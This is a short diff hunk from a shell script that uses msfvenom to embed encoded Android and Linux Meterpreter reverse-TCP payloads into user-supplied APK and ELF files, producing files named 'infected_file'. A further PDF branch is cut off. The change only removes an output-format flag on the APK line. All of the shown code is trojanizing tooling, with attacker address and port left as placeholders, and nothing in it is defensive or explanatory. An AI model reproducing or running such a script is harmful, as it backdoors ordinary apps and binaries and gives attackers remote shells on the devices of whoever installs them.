@@ -45,7 +45,7 @@ ext="${file_path##*.}"
 
 # Use MSFVenom to create the reverse shell payload with an encoder
 if [[ $ext == "apk" ]]; then
-  msfvenom -a android -x $file_path -e x86/shikata_ga_nai -i 5 -platform android -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f apk -o infected_file.apk
+  msfvenom -a android -x $file_path -e x86/shikata_ga_nai -i 5 -platform android -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -o infected_file.apk
 elif [[ $ext == "elf" ]]; then
   msfvenom -a linux -x $file_path -e shikata_ga_nai -i 5 -platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf -o infected_file.elf
 elif [[ $ext == "pdf" ]]; then
